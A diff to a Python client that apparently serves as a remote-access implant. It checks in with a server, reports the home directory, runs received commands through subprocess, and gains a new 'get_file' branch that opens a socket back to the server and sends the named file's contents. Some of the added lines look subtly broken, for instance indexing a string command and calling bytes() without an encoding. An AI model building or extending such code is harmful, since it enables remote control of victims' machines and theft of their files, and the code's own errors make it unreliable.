@@ -17,7 +17,13 @@ def main():
             if 'Arsenal' in command:
                 s.send(b'Client initial checkin\n')
                 s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
-                continue
+            elif 'get_file' in command:
+                fs=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                fs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                buff = 4096
+                fs.connect((args.server, 12))
+                with open(command[1]) as f:
+                    fs.sendall(bytes(f.read()))
             else:
                 print(command)
                 output = subprocess.run(command, stdout=subprocess.PIPE)
